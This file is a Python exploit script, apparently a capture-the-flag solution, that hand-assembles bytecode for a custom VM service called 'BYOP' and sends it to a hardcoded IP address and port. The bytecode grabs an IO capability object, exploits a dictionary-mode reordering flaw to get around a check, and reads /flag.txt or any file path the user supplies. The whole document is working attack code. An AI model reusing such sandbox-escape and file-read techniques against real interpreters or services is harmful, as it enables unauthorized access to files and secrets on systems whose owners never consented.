import argparse
import socket
from typing import ByteString


HOST = "35.245.96.82"
PORT = 5000


def _encode_str(value: str) -> bytes:
    data = value.encode()
    if len(data) > 512:
        raise ValueError("constant too long")
    return bytes([2]) + len(data).to_bytes(2, "little") + data


def build_program(target: str = "/flag.txt") -> bytes:
    consts = [
        _encode_str("caps"),
        _encode_str(target),
    ]

    nr = 5
    code = bytearray()

    def emit(data: ByteString) -> None:
        code.extend(data)

    def patch_rel(pos: int, width: int, dest: int) -> None:
        rel = dest - (pos + width)
        code[pos : pos + width] = rel.to_bytes(width, "little", signed=True)

    # r0 = globals["caps"]
    emit(bytes([0x02, 0x00, 0x00]))
    # r1 = r0.getOwn(3) -> IO object (caps[3])
    emit(bytes([0x20, 0x01, 0x00, 0x03]))

    label_loop = len(code)
    # (r2, r3) = r1.getMethod(10)
    emit(bytes([0x21, 0x02, 0x03, 0x01, 0x0A]))
    # r0 = "/flag.txt"
    emit(bytes([0x01, 0x00, 0x01]))
    # r4 = call r2(this=r3, args=[r0])
    emit(bytes([0x30, 0x04, 0x02, 0x03, 0x01, 0x00]))

    jmp_if_pos = len(code)
    emit(bytes([0x61, 0x04, 0x00, 0x00]))

    # trigger dict-mode reorder on the IO object
    emit(bytes([0x70, 0x01, 0x0A]))

    jmp_pos = len(code)
    emit(bytes([0x60, 0x00, 0x00]))

    label_ret = len(code)
    emit(bytes([0x31, 0x04]))

    patch_rel(jmp_if_pos + 2, 2, label_ret)
    patch_rel(jmp_pos + 1, 2, label_loop)

    blob = bytearray([nr, len(consts)])
    for entry in consts:
        blob.extend(entry)
    blob.extend(code)
    return bytes(blob)


def payload_hex(target: str = "/flag.txt") -> str:
    return build_program(target).hex()


def run_session(data: ByteString, host: str, port: int, timeout: float) -> str:
    line = data.hex().encode() + b"\n"
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall(line)
        
        chunks = []
        while True:
            block = sock.recv(4096)
            if not block:
                break
            chunks.append(block)
    return b"".join(chunks).decode(errors="replace")


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit the BYOP VM to read /flag.txt")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", default=PORT, type=int)
    parser.add_argument("--path", default="/flag.txt", help="path to read with the stolen primitive")
    parser.add_argument("--print-hex", action="store_true", help="print the crafted payload and exit")
    parser.add_argument("--timeout", default=10.0, type=float, help="socket timeout in seconds")
    args = parser.parse_args()

    payload = build_program(args.path)
    if args.print_hex:
        print(payload.hex())
        return

    response = run_session(payload, args.host, args.port, args.timeout)
    print(response, end="")


if __name__ == "__main__":
    main()